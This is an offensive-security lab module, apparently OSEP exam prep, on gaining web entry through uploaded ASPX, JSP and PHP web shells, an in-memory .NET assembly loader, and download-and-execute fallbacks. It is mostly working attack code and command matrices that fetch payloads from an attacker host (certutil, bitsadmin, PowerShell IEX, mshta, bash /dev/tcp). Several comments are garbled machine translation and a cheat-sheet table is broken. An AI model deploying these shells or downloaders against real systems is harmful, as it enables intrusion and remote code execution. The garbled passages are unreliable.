::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# Module 10 — Web entry: ASPX web shells and post-injection download/execute

Prove RCE with a tiny page. Swap downloaders when one is blocked. Watch command length.

> **Covers scenarios:** 14, 15, 16
>
> **Course mapping:** chapters on managed loading; web and service accounts; web-entry challenges
>
> **Prerequisites:** a web service that allows uploads or has an injection point; IIS/.NET (ASPX) or PHP/JSP runtime; attacker box has a delivery URL the target can reach

**Rules for this module**:
1. **Web-entry identity is usually low** (IIS app-pool account, `NT AUTHORITY\NETWORK SERVICE`). First check `whoami /priv` — `SeImpersonatePrivilege` decides whether you can escalate immediately.
2. **Public web shells get killed** — keep the page minimal; keep stage 2 independently swappable.
3. **Command length / quotes are silent killers** — injection points often truncate complex commands; a short stage 1 plus separate execute is almost always more reliable.

---

## Scenario 14: Site allows ASPX upload on IIS; AV is installed

**Situation**: Uploaded ASPX is parsed by the server and simple command execution works; public web shells or uploaded EXEs are killed; current identity is an app-pool account.

**Assumptions**:
- The upload directory is web-reachable and allows `.aspx` (or rename to `.ashx` / `.asmx` / `.config`).
- Target has AV (signatures for on-disk files and common web-shell fingerprints).
- Current identity is confirmed as an app-pool account (limited rights, but often has `SeImpersonatePrivilege`).

**Prepare (attacker)**:
1. Prepare three artifacts:
   | File | Purpose |
   |---|---|
   | `m10-minimal-exec.aspx` | Minimal exec entry (no UI, no extras) |
   | `m10-managed-loader.aspx` | Load managed assemblies / in-memory exec |
   | `m10-jsp-shell.jsp` / `m10-php-shell.php` | Fallbacks for other runtimes |
2. Keep stage 2 as an **independently swappable** file (avoid re-uploading the web shell for every change).
3. Delivery service:
   ```bash
   python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads
   ```

**Procedure**:
1. Upload the minimal ASPX, hit it once, confirm execution:
   ```text
   GET /upload/shell.aspx?cmd=whoami
   ```
2. Immediately check identity and privileges:
   ```text
   cmd=whoami /priv
   cmd=whoami /groups
   ```
3. If AV kills it → strip signatures: drop comments, avoid `eval`, split/encode command keywords; or change extension/path.
4. If uploaded EXE is killed → switch to **in-memory load**: ASPX only `Assembly.Load`s stage-2 bytes (Base64) into the IIS process — nothing on disk.
5. Once execution is stable: if `SeImpersonatePrivilege` is present → hand off to [06-uac-windows-privesc](/modules/06-uac-windows-privesc) scenario 26.

**Lab files**:
| File | Purpose | Key args |
|---|---|---|
| `m10-minimal-exec.aspx` | Minimal command execution | `cmd` |
| `m10-managed-loader.aspx` | Managed assembly in-memory load | `b64` |
| `m10-jsp-shell.jsp` / `m10-php-shell.php` | Non-IIS fallbacks | `cmd` |
| `m10-download-fallbacks.md` | Downloader fallback matrix | — |

#### `m10-minimal-exec.aspx` {#m10-minimal-exec-aspx}

````html
<%@ Page Language="C#" AutoEventWireup="true" Debug="false" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%--
Purpose: Extreme simplicity ASPX Orders to execute the entrance -- just one thing: URL Parameters cmd Here. cmd.exe /c Execute, plain text echo output。
      None UI、No upload/download/file management, no public Web Shell . The character string to minimize the object AV Probability of signature。
scene: 14（Upload directory parsing ASPX，Public Web Shell Killed.）、16（When the injection point is limited, use it as a long command channel.）
Dependency: IIS 6+ / .NET 2.0+；Apply pool account privileges.（w3wp.exe Implementation within the process）
Use: 
  1) Name after upload shell.aspx（Or allowed. .ashx/.asmx）
  2) Visits: http://TARGET/upload/shell.aspx?cmd=whoami%20/priv
  3) None cmd Return empty when parameters 200（To judge whether the page has been parsed）
Placeholder: TARGET=Target site address；cmd=Command to execute (need) URL Encoding, Space Writing %20）
Test status: Not present IIS measured;used python3 Label pairing/structural check (see end note) to be tested in the experimental environment
--%>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string c = Request["cmd"];
    if (c == null || c.Length == 0) return;

    Response.ContentType = "text/plain";

    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c " + c;
    psi.UseShellExecute = false;
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;
    psi.CreateNoWindow = true;
    psi.WorkingDirectory = "C:\\Windows\\Temp";

    try
    {
        using (Process p = Process.Start(psi))
        {
            Response.Write(p.StandardOutput.ReadToEnd());
            Response.Write(p.StandardError.ReadToEnd());
            p.WaitForExit(30000);
        }
    }
    catch (Exception ex)
    {
        Response.Write(ex.Message);
    }
}
</script>
<%--
Self-check statement (none) IIS static check methods）: 
  1) Tab Match: <@ ... %> and <script runat="server"> ... </script> Show up in pairs.，<%-- --%> Comment closed。
  2) C# parenthesis squared: used python3 Statistics Page_Load Inside. { and } Whether the quantity is equal。
  3) Quoted/separated: ProcessStartInfo Field grant and using Block ends in semicolon。
  Used above python3 Script ran (not installed) .NET Compiler, so only structural check. Real compiler needs Windows Used csc or IIS Initial Access Trigger）。
--%>
````

#### `m10-managed-loader.aspx` {#m10-managed-loader-aspx}

````html
<%@ Page Language="C#" AutoEventWireup="true" Debug="false" Trace="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Text" %>
<%--
Purpose: Host program set loader - Put .NET Set bytes（Base64 or POST body）Or read from disk path，
      Yes. w3wp.exe Within process Assembly.Load() And call the entrance.（EntryPoint or specify type/method）+ Parameters。
      EXE Do not land, use"Ban EXE Landing with hosting tools."The scene。
scene: 14（Uploaded EXE By AV Check it out. → Reload Memory）、20（Needed hosting tool but not allowed to land）
Dependency: IIS + .NET 4.x（Program number/target framework to be consistent with application pool；x64 Pool Loading AnyCPU/x64 Program Set）
Use: 
  # 1) Byte arrays (most commonly used, aligned) docs/10 scene 14 Yes."Pass Base64"）
  curl -k "http://TARGET/upload/loader.aspx?b64=<BASE64Program Set>&args=-a%20-b"
  # 2) From disk (the program set has been written to the target in another way) Let's go.）
  curl -k "http://TARGET/upload/loader.aspx?file=C:\Windows\Temp\p.exe&type=Payload.Runner&method=Run"
  # 3) Direct POST Original bytes (request body, set of programs)）
  curl -k --data-binary @payload.exe "http://TARGET/upload/loader.aspx?args=whoami"
  # Not type/method Autotake when asm.EntryPoint；And... type Not method to list the open static methods of this type First Name。
Placeholder: TARGET=Target site；LHOST/URL=Source of the set (this page is not downloadable automatically and needs to be supported when downloading) m10-download-fallbacks.md）；
        b64=Base64 Program Set；file=Program set path on target disk；type/method=Entry；args=Parameters (default split by space, available) argssep Specify Separator）
Test status: Not present IIS measured;used python3 Label pairing / parenthesis check, to be validated in the experimental environment
--%>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    Response.ContentType = "text/plain";

    string file = Request["file"];
    string b64 = Request["b64"];
    string typeName = Request["type"];
    string methodName = Request["method"];
    string argstr = Request["args"];
    string sep = Request["argssep"];

    byte[] raw = null;
    try
    {
        if (!string.IsNullOrEmpty(file))
            raw = File.ReadAllBytes(file);
        else if (!string.IsNullOrEmpty(b64))
            raw = Convert.FromBase64String(b64);
        else if (Request.ContentLength > 0)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                Request.InputStream.CopyTo(ms);
                raw = ms.ToArray();
            }
        }
    }
    catch (Exception ex)
    {
        Response.Write("read error: " + ex.Message);
        return;
    }

    if (raw == null || raw.Length == 0) return;

    string[] argv;
    if (string.IsNullOrEmpty(argstr))
        argv = new string[0];
    else if (!string.IsNullOrEmpty(sep))
        argv = argstr.Split(new string[] { sep }, StringSplitOptions.RemoveEmptyEntries);
    else
        argv = argstr.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);

    try
    {
        Assembly asm = Assembly.Load(raw);

        MethodInfo mi = null;
        if (string.IsNullOrEmpty(typeName))
        {
            mi = asm.EntryPoint;
        }
        else
        {
            Type t = asm.GetType(typeName);
            if (t == null)
            {
                Response.Write("type not found: " + typeName);
                return;
            }
            if (string.IsNullOrEmpty(methodName))
            {
                foreach (MethodInfo m in t.GetMethods(BindingFlags.Public | BindingFlags.Static))
                    Response.Write(m.Name + "/" + m.GetParameters().Length + " ");
                return;
            }
            mi = t.GetMethod(methodName,
                BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance);
        }

        if (mi == null)
        {
            Response.Write("entry point not found");
            return;
        }

        ParameterInfo[] ps = mi.GetParameters();
        object[] parameters;
        if (ps.Length == 0)
            parameters = null;
        else if (ps.Length == 1 && ps[0].ParameterType == typeof(string[]))
            parameters = new object[] { argv };
        else if (ps.Length == 1 && ps[0].ParameterType == typeof(string))
            parameters = new object[] { argstr == null ? "" : argstr };
        else
        {
            StringBuilder sb = new StringBuilder();
            foreach (ParameterInfo pi in ps) sb.Append(pi.ParameterType.Name).Append(" ");
            Response.Write("signature mismatch, need: " + sb.ToString());
            return;
        }

        // Most hosting tools Console Turn it down. Take over here. Console.Out Return Output Together
        TextWriter old = Console.Out;
        StringWriter captured = new StringWriter();
        object result = null;
        string error = null;
        try
        {
            Console.SetOut(captured);
            object instance = mi.IsStatic ? null : Activator.CreateInstance(mi.DeclaringType);
            result = mi.Invoke(instance, parameters);
        }
        catch (TargetInvocationException tie)
        {
            error = tie.InnerException == null ? tie.Message : tie.InnerException.Message;
        }
        finally
        {
            Console.SetOut(old);
        }

        Response.Write(captured.ToString());
        if (error != null)
            Response.Write("invoke error: " + error);
        else if (result != null)
            Response.Write(result.ToString());
    }
    catch (Exception ex)
    {
        Response.Write("load error: " + ex.Message);
    }
}
</script>
<%--
Self-check statement (none) IIS static check methods）: 
  1) Tab Match: <%@ %>、<script runat="server">...</script>、<%-- --%> The three are closed.。
  2) C# parenthesis squared: used python3 Statistics Page_Load Inside. { and } Number equal, brackets pair。
  3) Every class used is here. Import Or full name.（System.Reflection / System.IO / System.Text Already Import）。
  Other Organiser Windows Top. <script> Intracode glued .cs Use csc /t:library Compile to confirm syntax.。
--%>
````

#### `m10-jsp-shell.jsp` {#m10-jsp-shell-jsp}

````xml
<%--
Purpose: streamlining JSP Command execution entrance.——Tomcat/Jetty/JBoss alternative channel under a container; automatically press os.name Selection
      /bin/sh -c（Linux）or cmd.exe /c（Windows），Standard output combined with error output echo。
scene: 14 Alternative（Web Access exists, but runs from JSP Not ASPX）、16（A long command channel beyond a limited length injection point）
Dependency: Servlet Containers（Tomcat 7+ / JDK 6+）；Container process account privileges are sufficient
Use: 
  1) Upload to Accessible webapps Contents /var/lib/tomcat9/webapps/ROOT/shell.jsp）
  2) Visits: http://TARGET/shell.jsp?cmd=id
  3) None cmd Back on arguments "ready"（The confirmation page has been compiled and executed）
Placeholder: TARGET=Target site；cmd=Command to execute (need) URL Encoded）
Test status: Not present Tomcat measured;used python3 Label pairing/structure check to be validated in the experimental environment
--%>
<%@ page contentType="text/plain;charset=UTF-8" %>
<%@ page import="java.io.*" %>
<%
    String c = request.getParameter("cmd");
    if (c == null || c.trim().length() == 0) {
        out.print("ready");
        return;
    }

    String os = System.getProperty("os.name").toLowerCase();
    String[] real;
    if (os.indexOf("win") >= 0)
        real = new String[] { "cmd.exe", "/c", c };
    else
        real = new String[] { "/bin/sh", "-c", c };

    try {
        ProcessBuilder pb = new ProcessBuilder(real);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line);
        }
        br.close();
        p.waitFor();
    } catch (Exception e) {
        out.println("error: " + e.getMessage());
    }
%>
<%--
Self-check statement (none) Tomcat static check methods）: 
  1) Tab Match: <%@ page %> Commands and <% ... %> Script segment closed，<%-- --%> Comment closed。
  2) Java parenthesis/bracket flat: used python3 Statistics { } and ( ) Equal number。
  3) Authentication: Tomcat The first visit is compiled; or the script section is drawn into .java Use javac Authentication Syntax:。
--%>
````

#### `m00-delivery-server.py` {#m00-delivery-server-py}

````python
#!/usr/bin/env python3
"""Purpose: Delivery server——HTTP/HTTPS Two channels to record the origin of each request、User-Agent、Path to confirm"Is the target actually downloading?"

Scenario: General infrastructure (cooperating) docs/00-environment-and-infra.md；Support the scene 3、8、15、16、17、28、30、31 Other Organiser）

Dependency: Python 3.7+（Standard library）；HTTPS Yes. cert/key（Available openssl or m00-build-payloads.sh Generate）

Use: 
    # HTTP（Default 80）
    python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads

    # HTTPS（Automatically）
    python3 m00-delivery-server.py --port 443 --dir ~/osep/payloads \
        --cert ~/osep/tools/cert.pem --key ~/osep/tools/key.pem

    # Detection mode only: not return file, only record request (confirm target access path)）
    python3 m00-delivery-server.py --port 8000 --probe-only

Placeholder: LHOST=Attack aircraft IP（Scripts are available for printing URL）；PAYLOAD=Put it on. --dir Load File Name for Below

Test status: Already macOS Current Python 3 Syntax Validation（py_compile）；HTTP Mode to run validation directly
"""
from __future__ import annotations

import argparse
import datetime
import http.server
import os
import socket
import ssl
import sys
import threading

class LoggedHandler(http.server.SimpleHTTPRequestHandler):
    """Static file service with structured logs；probe-only Mode only record not returning files。"""

    probe_only = False
    log_path = "delivery.log"
    server_version = "DeliveryServer/1.0"
    _lock = threading.Lock()

    def _client(self) -> str:
        return f"{self.client_address[0]}:{self.client_address[1]}"

    def _record(self, method: str, status: int, note: str = "") -> None:
        stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ua = self.headers.get("User-Agent", "-")
        host = self.headers.get("Host", "-")
        line = f"{stamp}\t{self._client()}\t{method}\t{self.path}\t{status}\t{host}\t{ua}\t{note}"
        with self._lock:
            with open(self.log_path, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
        print(line, flush=True)

    def do_GET(self):  # noqa: N802
        if self.probe_only:
            self._record("GET", 200, "probe-only")
            body = b"ok\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self._record("GET", 200)
        super().do_GET()

    def do_POST(self):  # noqa: N802
        length = int(self.headers.get("Content-Length", 0) or 0)
        data = self.rfile.read(length) if length else b""
        self._record("POST", 200, f"body={data[:200]!r}")
        body = b"ok\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_HEAD(self):  # noqa: N802
        self._record("HEAD", 200)
        super().do_HEAD()

    def log_message(self, fmt, *args):  # Cursor Default stderr Output, one step. _record
        return

def local_ips() -> list[str]:
    ips = set()
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None, socket.AF_INET):
            ips.add(info[4][0])
    except Exception:
        pass
    # Bottom: detect the default route exit address
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips.add(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    return sorted(ip for ip in ips if not ip.startswith("127."))

def main() -> int:
    ap = argparse.ArgumentParser(description="OSEP Organisation（HTTP/HTTPS + Request Log）")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--dir", default=os.path.expanduser("~/osep/payloads"))
    ap.add_argument("--cert", default="")
    ap.add_argument("--key", default="")
    ap.add_argument("--log", default="", help="Log path, default <dir>/../logs/delivery.log")
    ap.add_argument("--probe-only", action="store_true", help="Record requests only, do not return files")
    args = ap.parse_args()

    root = os.path.abspath(os.path.expanduser(args.dir))
    if not os.path.isdir(root):
        os.makedirs(root, exist_ok=True)
    log_path = args.log or os.path.join(os.path.dirname(root), "logs", "delivery.log")
    os.makedirs(os.path.dirname(log_path), exist_ok=True)

    LoggedHandler.probe_only = args.probe_only
    LoggedHandler.log_path = log_path

    handler = lambda *a, **kw: LoggedHandler(*a, directory=root, **kw)  # noqa: E731
    httpd = http.server.ThreadingHTTPServer((args.bind, args.port), handler)

    scheme = "http"
    if args.cert and args.key:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=os.path.expanduser(args.cert), keyfile=os.path.expanduser(args.key))
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
        scheme = "https"

    print(f"[*] Cannot initialise Evolution's mail component.: {root}")
    print(f"[*] Request Log:   {log_path}")
    print(f"[*] Mode:       {'probe-only（Record only）' if args.probe_only else 'File delivery'}")
    print("[*] Available Addresses:")
    for ip in local_ips():
        print(f"      {scheme}://{ip}:{args.port}/PAYLOAD")
    print("[*] Ctrl+C Stop")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopped")
    finally:
        httpd.server_close()
    return 0

if __name__ == "__main__":
    sys.exit(main())
````

#### `m10-download-fallbacks.md` {#m10-download-fallbacks-md}

````markdown
# Downloader fallback matrix (scenarios 15 / 16 / 17)

> Purpose: When a download tool is stopped after the command is executed, press"Blocked. → Which one?"The order is next.。**One variable at a time.**And record the results.。
>
> scene: 15（Injection points can execute orders, but downloaders are blocked.）、16（The length of the command is limited.）、17（No stable checkout）
>
> Dependence: attack side delivery service `python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads`
>
> Placeholder: `LHOST`（Attack aircraft IP）、`LPORT`（Attack machine port）、`PAYLOAD`（Organisation）、`URL`（Complete http(s) Address）、`TARGET`（Objective）
>
> Test status: command template manually checked the order of parameters; not measured in the target environment, as per test 5 A non-hazardous download validation of the knot

---

## 1. Main Order（Windows Target: To be stopped, you can switch down.

| Order | Tools | Command Template | Length | If you're stopped, change your judgment. |
|---|---|---|---|---|
| 1 | `curl` | `curl -s -o C:\Windows\Temp\PAYLOAD URL` | Medium | Win10 1803+ Self-contained, most commonly available; reporting"Not internal or external."→ It means the system is too old. Change it. 2 |
| 2 | `certutil` | `certutil -urlcache -split -f URL C:\Windows\Temp\PAYLOAD` | Medium | I've been... AppLocker/AV Stop!"Access denied"Or back to the code. 0）→ Switch 3；Remember when you're done. `certutil -urlcache -split -f URL delete` Cache Entry |
| 3 | `bitsadmin` | `bitsadmin /transfer j /download /priority normal URL C:\Windows\Temp\PAYLOAD` | Long | Come on. BITS Services, logs visible; reports"Could not initialise Bonobo BITS"→ Switch 4 |
| 4 | PowerShell `DownloadString`（Memory, no landing） | `powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('URL')"` | Long | Attention. AMSI（See `m05-amsi-bypass-variants.ps1`）；By AMSI/CLM Stop! → Switch 5 |
| 5 | PowerShell `WebClient.DownloadFile` | `powershell -nop -w hidden -c "(New-Object Net.WebClient).DownloadFile('URL','C:\Windows\Temp\PAYLOAD')"` | Long | and 4 It's the same kind of client. PowerShell The floor is blocked. → Switch 6 |
| 6 | `wget`（If the target is installed） | `wget -q URL -O C:\Windows\Temp\PAYLOAD` | Short | rare;not installed → Switch 7 |
| 7 | Python one-liner（The target is. Python） | `python -c "import urllib.request;urllib.request.urlretrieve('URL','C:\\Windows\\Temp\\PAYLOAD')"` | Medium | None Python → Switch 8 |
| 8 | `rundll32` + `url.dll`（Request/take documents only, often used for connectivity validation） | `rundll32.exe url.dll,OpenURL URL` | Medium | It plays the associated program, usually only to prove it."It's a net."；Could not initialise Bonobo 9 |
| 9 | `regsvr32` / `mshta` Remote execution (in place) EXE，Direct Script） | `mshta http://LHOST/PAYLOAD.hta` | Short | Yes. AV/AMSI Attention; see usage `docs/02-hta.md` |
| 10 | `ncat`/`nc`（Last resort, we need our cooperation.） | Objective: `ncat LHOST LPORT > C:\Windows\Temp\PAYLOAD`；Attack aircraft: `ncat -lvnp LPORT < PAYLOAD` | Short | We need a target. ncat，And interactive/backstage execution |

**Order Memory Method**: curl → certutil → bitsadmin → PowerShell → wget → python → rundll32 → nc。

---

## 2. Linux Objective (Same line)）

| Order | Command Template |
|---|---|
| 1 | `curl -s URL -o /tmp/.PAYLOAD && chmod +x /tmp/.PAYLOAD` |
| 2 | `wget -q URL -O /tmp/.PAYLOAD && chmod +x /tmp/.PAYLOAD` |
| 3 | `python3 -c "import urllib.request;urllib.request.urlretrieve('URL','/tmp/.PAYLOAD')"` |
| 4 | `python -c "import urllib;urllib.urlretrieve('URL','/tmp/.PAYLOAD')"`（Python2 The old target.） |
| 5 | `bash -c 'cat < /dev/tcp/LHOST/LPORT > /tmp/.PAYLOAD'`（bash Internal construction, most difficult to stop; attack machine required `ncat -lvnp LPORT < PAYLOAD`） |
| 6 | `printf 'GET /PAYLOAD HTTP/1.0\r\n\r\n' > /dev/tcp/LHOST/LPORT`（Only check out.） |

---

## 3. Shortest time limit for command length (scenario) 16）

```text
# Only downloads first 30 Character, Shortest）
curl -so a http://LHOST/a
# Reimplementation（2 Character）
a

# One-line version 35 Character）
curl -so a http://LHOST/a&a

# certutil Shortest 40 Character）
certutil -urlcache -f http://LHOST/a a

# PowerShell Shortest 60 Characters, including -c Quotes）
powershell -c "iwr http://LHOST/a -o a"
```

**First measuring length limit**Re-selection tool: step-by-step increases in harmless commands（`echo AAAA...`），Found cut boundaries; filter spaces or quotation marks for injection points instead `+` or Base64 Version of parameters (see `docs/10-web-entry-webshell.md` scene 16）。

---

## 4. Check after download (must do it, otherwise you'll waste time checking)"False success"）

```cmd
certutil -hashfile C:\Windows\Temp\PAYLOAD MD5
```
```bash
md5sum /tmp/.PAYLOAD          # Linux Objective
```
And the attack machine. `md5sum ~/osep/payloads/PAYLOAD` Contrast: Hash incoherence = Changed by proxy/cachel or not downloaded complete。

---

## 5. Check for discipline.）

| phenomena | Conclusions | Next |
|---|---|---|
| Organisation**Nothing.**Request | The tools were stopped or the orders were not executed. | Change tool (Section I of this document) 1 Order of sections; running first `curl -s -o nul URL` Validate implementation chain |
| Requested but target file does not exist | Writing path is not allowed/ by AV sec | Change Directory（`%TEMP%`、`C:\ProgramData\`）、Change File Name |
| File exists but Hash does not match | Proxy/Cachecut | Switch HTTPS（`docs/09` scene 31）OR DIFFERENT VERIFICATION |
| Document correct but execution failed | Static/behaviour testing | Turn `docs/05-applocker-clm-amsi.md` scene 18/19 |
| All downloaders are blocked. | The transmission channel is dead. | Upload Channel（`m10-managed-loader.aspx` Pass Base64）、Agent 28）、DNS（scene 32）、Domain Forward (scenes) 33） |

---

## 6. Related scripts

| Script | Use |
|---|---|
| `m00-delivery-server.py` | Organisation + Request log (judgement)"Is there a real request?"） |
| `m10-minimal-exec.aspx` | Yeah. Web Shell Long command execution channel |
| `m10-managed-loader.aspx` | When all downloads are stopped, use Base64 Send stage 2 directly to memory |
| `m05-amsi-bypass-variants.ps1` | PowerShell Downloader by AMSI Time-stopped processing |
| `m09-https-listener.sh` | Yes. HTTPS Starting on delivery TLS Listen |
````

**Verify**: HTTP 200 and return command output; `whoami ' displays application pool accounts; `w3wp.exe ' appears in `tasklist ' (ASPX executed within w3wp process).

**If it fails / alternatives**:
1. **ASPX was seized** to streamline + code; or to use `.ashx '/`.asmx ' ; or to upload `.config ' to trigger resolution (see the environment).
2. ** EXE was killed** memory loading (`Assembly.Load ' ) or with PowerShell reflection (if w3wp permits).
3. ** Upload restricted** (extended white list) to find other upload points, solve loopholes, or inject points (scenario 15/16).
4. **The application of pool account privileges is too low and the SeImpersonate** is not available to find other service accounts on the server (idS configuration, certificates in connection strings).

** Test note / OPSEC**: Web Shell is only the "execution portal" and all heavy work is given to the second phase of independence; so each time they are found, they simply need to change one file without retrieving the upload point.

---

## Scenario 15: Classic ASP site has SQLi with OS command exec, but downloaders are blocked

**Situation**: You already have OS command execution via the database, but one system downloader fails while another can fetch the same file. Prepare **transfer fallbacks**, not a new injection toolkit.

**Assumptions**:
- You can already run OS commands through the injection point (`xp_cmdshell` or equivalent).
- Target has egress, but some downloaders are blocked by application control / AV / proxy.
- You already have a validated EXE/script as stage 2.

**Prepare (attacker)**: Prepare the downloader fallback matrix (`m10-download-fallbacks.md`)

| Priority | Tool | Command template | Notes |
|---|---|---|---|
| 1 | `curl` | `curl -o C:\Windows\Temp\p.exe http://LHOST/p.exe` | Built into Win10+; most often available |
| 2 | `certutil` | `certutil -urlcache -split -f http://LHOST/p.exe C:\Windows\Temp\p.exe` | Classic; often policy-blocked |
| 3 | `bitsadmin` | `bitsadmin /transfer j /download /priority normal http://LHOST/p.exe C:\Windows\Temp\p.exe` | Uses BITS service |
| 4 | PowerShell | `powershell -nop -w hidden -c "IWR -Uri http://LHOST/p.exe -OutFile C:\Windows\Temp\p.exe"` | Watch AMSI |
| 5 | `wget`/`nc` | `nc LHOST 80 > p.exe` (needs interaction) | Last resort |

**Procedure**:
1. Confirm egress: from the injection point run `curl -s -o nul http://LHOST/ping` (success = your delivery log shows the hit).
2. Walk the matrix one tool at a time — **change only one variable**.
3. After download, verify: `certutil -hashfile C:\Windows\Temp\p.exe MD5` matches the attacker box.
4. Then execute; if execution is blocked → hand off to `docs/05` scenarios 18/19.

**Lab files**:
| File | Purpose | Key args |
|---|---|---|
| `m10-download-fallbacks.md` | Downloader fallback matrix and commands | LHOST/URL |
| `m10-minimal-exec.aspx` | Alternate exec channel when you have a web shell | `cmd` |

**Verify**: Delivery logs show a request from the target IP; file exists on target with matching hash; callback or output after execute.

**If it fails / alternatives**:
1. **Every downloader blocked** → switch to an upload channel (web shell / upload point) or embed Base64 in chunks.
2. **Only allowlisted domains egress** → domain fronting / proxy ([09-c2-egress-channels](/modules/09-c2-egress-channels)).
3. **Command escaped/truncated** → shorten it (scenario 16).

**Exam notes / OPSEC**: A failed downloader **does not mean the network is dead** — read the delivery log first to separate "never requested" (tool blocked) from "requested but no return" (network/proxy).

---

## Scenario 16: Web command injection only accepts very short commands

**Situation**: An internal page (ping, etc.) is injectable, but argument length is capped; complex quotes and nested commands get truncated.

**Assumptions**:
- Injection exists, but length/charset is limited (often < 100 characters).
- Target has egress (otherwise embed).

**Prepare (attacker)**:
1. Prepare an **extremely short stage 1** (turn long commands into "download a script, then run it"):
   ```text
   # download only (~40 chars)
   certutil -urlcache -f http://LHOST/a a
   # then execute
   a
   ```
2. Prepare encoded-argument variants for the target interpreter (Base64 args; avoid quotes).
3. Stage-2 script pre-staged with a short filename (`a`, `b`).

**Procedure**:
1. Measure the length ceiling: grow a harmless command (`echo AAAA...`) until truncation.
2. Use two steps: first write the file, second only execute.
3. Confirm each step via the delivery log (did the target actually request?).
4. If quotes get truncated → Base64/hex args, or write content to a file then execute.
5. If still too long → concatenate with redirects (`>a`, `>>a`) across multiple injections.

**Lab files**:
| File | Purpose | Key args |
|---|---|---|
| `m10-download-fallbacks.md` | Short-command download templates | LHOST |
| `m10-minimal-exec.aspx` | Long-command channel once you have a web shell | `cmd` |

**Verify**: Delivery log shows requests in order; file exists on target; callback/output after execute.

**If it fails / alternatives**:
1. **Two-step still truncated** → shorter downloader (`bitsadmin /transfer` is long; prefer `curl -o a http://LHOST/a`).
2. **No egress** → embed Base64 (length-limited — needs multi-chunk writes).
3. **Keyword filter** (`curl`/`certutil` blocked) → equivalent tools or encoded args.

**Exam notes / OPSEC**: Spend two minutes measuring the length ceiling — faster than guessing; shorter filenames win.

---

## Module cheat sheet

| Goal | Command / tip |
|---|---|
Simplified ASPX Implementation `m10-minimal-exec.aspx ' (plus `?cmd=whoami')
| Memory loading phase II
Identity and privileges `whoami /priv ' (focusing on SeImpersonate Privilege) |
|Curl →Certutil →bitsadmin →PowerShell →nc|
`certutil-hashfile p.exe MD5'
The length of the command is limited.
| Simplified / Encoding / Extension / Memory Loading |

## Related lab files

| File | Notes |
|---|---|
`m10-minimal-exec.aspx ' , streamline the implementation portal
`m10-managed-loader.aspx ' | hosting program load
`m10-jsp-shell.jsp '
`m10-php-shell.php ' |PHP Alternative |
`m10-download-fallbacks.md`
`m05-amsi-bypass-varians.ps1' | PowerShell while downloading AMSI processing |
`m00-delivery-server.py`

#### `m10-php-shell.php` {#m10-php-shell-php}

````php
<?php
/*
Purpose: streamlining PHP Command execution entrance - overwrite LAMP / nginx+php-fpm / IIS+PHP scenes;pressing PHP_OS AutoSelect
      /bin/sh -c（Linux）or cmd /c（Windows）；The command execution function is downgraded as available。
scene: 14 Alternative（Web The entrance exists but runs on PHP）、15/16（Long command routes for injection/upload but stable）
Dependency: PHP 5.4+；proc_open / shell_exec / exec / system / passthru / popen At least one was not. disable_functions
Use: 
  1) Upload to Web Accessible directories (e.g. /var/www/html/shell.php）
  2) Visits: http://TARGET/shell.php?cmd=id
  3) None cmd Back on arguments "ready"（Confirm. PHP Parsed and Not WAF Stop!）
Placeholder: TARGET=Target site；cmd=Command to execute (need) URL Encoded）
Test status: Not measured at target; used php -l（None PHP Time for Environment python3 Label pair check)
*/

if (!isset($_REQUEST['cmd']) || trim($_REQUEST['cmd']) === '') {
    header('Content-Type: text/plain; charset=UTF-8');
    echo "ready";
    exit;
}

$cmd = $_REQUEST['cmd'];
header('Content-Type: text/plain; charset=UTF-8');

$is_win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');

if (function_exists('proc_open')) {
    if ($is_win) {
        $argv = $cmd;
    } else {
        $argv = '/bin/sh -c ' . escapeshellarg($cmd);
    }
    $desc = array(
        1 => array('pipe', 'w'),
        2 => array('pipe', 'w'),
    );
    $proc = proc_open($argv, $desc, $pipes);
    if (is_resource($proc)) {
        echo stream_get_contents($pipes[1]);
        echo stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($proc);
        exit;
    }
}

if (function_exists('shell_exec')) {
    echo shell_exec($cmd);
    exit;
}

if (function_exists('exec')) {
    $out = array();
    $code = 0;
    exec($cmd, $out, $code);
    echo implode("\n", $out);
    exit;
}

if (function_exists('system')) {
    system($cmd);
    exit;
}

if (function_exists('passthru')) {
    passthru($cmd);
    exit;
}

if (function_exists('popen')) {
    $h = popen($cmd, 'r');
    if (is_resource($h)) {
        while (!feof($h)) {
            echo fread($h, 4096);
        }
        pclose($h);
        exit;
    }
}

